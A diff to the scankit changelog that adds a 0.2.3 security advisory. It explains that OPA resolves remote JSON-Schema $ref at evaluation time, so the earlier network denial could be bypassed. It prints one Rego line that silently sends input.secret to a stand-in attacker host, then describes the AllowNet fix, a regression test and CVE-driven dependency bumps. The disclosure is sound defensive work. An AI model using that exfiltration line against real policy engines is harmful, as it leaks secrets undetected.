@@ -6,6 +6,42 @@ All notable changes to scankit are documented here. The format follows
 
 ## [Unreleased]
 
+## [0.2.3] - 2026-09-04
+
+### Security
+- **The 0.2.2 network denial was bypassable through JSON-Schema `$ref`.** Removing `http.send`,
+  `net.lookup_ip_addr` and `opa.runtime` from the capability set did not close the hole it
+  claimed to: OPA resolves a schema's remote `$ref` over HTTP at **evaluation** time, so a
+  runtime-loaded policy could still exfiltrate the evaluated input with one line:
+
+  ```rego
+  json.match_schema(input, {"$ref": sprintf("%s/leak/%s", [attacker, input.secret])})
+  ```
+
+  Measured on 0.2.2 with a witness server: one request per builtin, path `/leak/EXFIL-TOKEN`,
+  and `Evaluate` returned **no error** — the exfiltration was silent. `json.verify_schema`
+  behaves the same way.
+
+  The capability set now carries `AllowNet: []string{}` (an empty, non-nil list denies every
+  host; the `nil` default means "any host"). That field is only honoured by the schema loader
+  at evaluation time from OPA 1.20, which is why the bump below ships with the fix rather than
+  after it.
+
+  `TestSchemaRefsCannotReachTheNetwork` counts requests received rather than errors returned,
+  because there is no error to assert on: it fails on the previous code with the witness
+  recording `/leak/EXFIL-TOKEN`, and passes here with zero requests. No functionality is lost —
+  a posture rule decides from the input it is given; `TestOrdinaryBuiltinsStillWork` and the
+  existing engine suite stay green.
+
+### Changed
+- OPA 1.18.2 → 1.20.2 (required by the fix above; also brings `strings.split_n`).
+- `golang.org/x/crypto` forced to 0.56.0, clearing CVE-2026-56854 (SSH source-address
+  restriction bypass) and CVE-2026-78662 / CVE-2026-56855 (SSH channel denial of service).
+  scankit does not import `x/crypto/ssh`, so `govulncheck` reported no reachable call and no
+  Dependabot alert was possible (the advisories carry no package mapping in GitHub's database);
+  the bump is what turns OSV-Scanner, Trivy and the Scorecard vulnerabilities check green again,
+  and it removes the transitive exposure from every consumer.
+
 ## [0.2.2] - 2026-08-19
 
 ### Security
@@ -90,7 +126,11 @@ pitstop and pavois security scanners.
   (build/test/vet/govulncheck, CodeQL, OpenSSF Scorecard, dependency-review, Trivy,
   OSV-Scanner, TruffleHog, SBOM) and an SLSA-attested release workflow.
 
-[Unreleased]: https://github.com/stephrobert/scankit/compare/v0.2.0...HEAD
+[Unreleased]: https://github.com/stephrobert/scankit/compare/v0.2.3...HEAD
+[0.2.3]: https://github.com/stephrobert/scankit/releases/tag/v0.2.3
+[0.2.2]: https://github.com/stephrobert/scankit/releases/tag/v0.2.2
+[0.2.1]: https://github.com/stephrobert/scankit/releases/tag/v0.2.1
 [0.2.0]: https://github.com/stephrobert/scankit/releases/tag/v0.2.0
+[0.1.5]: https://github.com/stephrobert/scankit/releases/tag/v0.1.5
 [0.1.3]: https://github.com/stephrobert/scankit/releases/tag/v0.1.3
 [0.1.0]: https://github.com/stephrobert/scankit/releases/tag/v0.1.0
